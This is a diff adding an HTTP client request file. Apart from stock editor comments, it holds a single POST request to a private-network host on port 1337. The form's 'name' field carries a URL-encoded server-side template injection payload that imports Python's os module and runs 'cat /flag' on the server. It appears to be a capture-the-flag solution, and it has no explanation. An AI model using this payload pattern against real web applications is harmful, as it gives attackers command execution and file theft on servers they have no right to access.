@@ -1,0 +1,12 @@
+# For a quick start check out our HTTP Requests collection (Tools|HTTP Client|Open HTTP Requests Collection).
+#
+# Following HTTP Request Live Templates are available:
+# * 'gtrp' and 'gtr' create a GET request with or without query parameters;
+# * 'ptr' and 'ptrp' create a POST request with a simple or parameter-like body;
+# * 'mptr' and 'fptr' create a POST request to submit a form with a text or file field (multipart/form-data);
+POST http://172.16.22.18:1337/lskdfjjklfhgjklkjwqrnqejkdla
+Content-Type: application/x-www-form-urlencoded
+
+_xsrf=2%7C51eb82c5%7C065069530c5a03ffae33de0fc97799aa%7C1532488061&name=%7B%7B+__import__%28%22os%22%29.popen%28%22cat+%2Fflag%22%29.read%28%29+%7D%7D
+
+###
